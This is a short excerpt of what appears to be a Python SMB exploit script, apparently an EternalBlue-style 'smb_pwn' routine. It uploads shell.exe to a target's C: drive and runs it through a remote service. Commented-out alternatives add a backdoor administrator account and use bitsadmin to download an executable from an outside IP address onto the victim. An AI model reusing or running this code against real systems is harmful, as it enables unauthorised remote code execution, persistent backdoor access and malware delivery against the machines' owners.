...
def smb_pwn(conn, arch):
	...
	smb_send_file(smbConn, '/root/Desktop/shell.exe', 'C', '/shell.exe')
	print('exploit uploaded')
	service_exec(conn, r'cmd /c c:\shell.exe')
	#service_exec(conn, r'cmd /c net user John fadf24as /add')
	#print('add user to localgroup')
	#service_exec(conn, r'cmd /c net localgroup administrators John /add')
	#print('Downloading the exploit')
	#service_exec(conn, r'cmd /c bitsadmin /transfer pwn /download http://10.11.0.154/sc.exe C:\sc.exe')
	#print('runnunig the exploit...')
